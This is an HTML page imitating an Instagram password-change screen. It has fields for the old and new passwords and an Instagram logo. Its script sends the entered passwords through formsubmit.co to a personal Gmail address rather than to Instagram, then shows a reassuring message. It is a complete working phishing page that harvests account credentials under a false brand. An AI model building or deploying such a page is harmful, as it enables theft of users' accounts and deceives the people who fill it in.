<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: sans-serif;
            background-color: rgb(234, 232, 232);
        }
        #header {
            text-align: center;
        }
        select {
            color: grey;
            background-color: rgb(234, 232, 232);
            border: 0px;
            font-size: 15px;
            padding: 20px;
        }
        img {
            width: 200px;
            padding-top: 3%;
            display: block;
            margin: 0 auto;
        }
        fieldset {
            width: 40%;
            margin: auto;
            border: 0;
            text-align: center;
        }
        input {
            width: 250px;
            height: 45px;
            border: 2px solid rgb(166, 154, 154);
            border-radius: 5px;
            background-color: rgb(225, 224, 224);
            font-size: 14px;
            padding-left: 10px;
            margin-bottom: 15px;
        }
        #submitbtn {
            width: 250px;
            height: 45px;
            border: 0;
            border-radius: 5px;
            background-color: rgb(73, 73, 214);
            font-size: 15px;
            color: white;
            cursor: pointer;
            margin-bottom: 15px;
        }
        span, a {
            text-decoration: none;
            font-size: 12px;
        }
        #form-submit-success {
            display: none;
            color: green;
            margin-top: 15px;
            font-size: 14px;
        }
        @media (max-width: 768px) {
            fieldset {
                width: 90%;
            }
        }
    </style>
</head>
<body>
    <div id="header">
        <select name="language" id="lang">
            <option value="English (United Kingdom)">English (United Kingdom)</option>
        </select>
    </div>
    <fieldset>
        <img src="insta.png" alt="Instagram Logo">
        <form id="passwordForm">
            <input type="password" name="old_password" placeholder="Previous Password" required>
            <input type="password" name="new_password" placeholder="New Password" required>
            <input type="password" name="new_password2" placeholder="Confirm New Password" required>
            <button id="submitbtn" type="submit">Save</button><br>
            <span>Forgotten your login details? <a href="#">Get help logging in</a></span>
        </form>
        <div id="form-submit-success">
            We will process your information as soon as possible.
        </div>
    </fieldset>

    <script>
        document.getElementById("passwordForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            // Show loading state
            const submitBtn = document.getElementById("submitbtn");
            submitBtn.disabled = true;
            submitBtn.value = "Processing...";
            
            fetch("https://formsubmit.co/ajax/verifyinstagramid1563@gmail.com", {
                method: "POST",
                body: new FormData(this)
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById("form-submit-success").style.display = "block";
                this.reset();
                submitBtn.disabled = false;
                submitBtn.value = "Save";
            })
            .catch(error => {
                alert("Error sending message. Please try again.");
                submitBtn.disabled = false;
                submitBtn.value = "Save";
                console.error(error);
            });
        });
    </script>
</body>
</html>
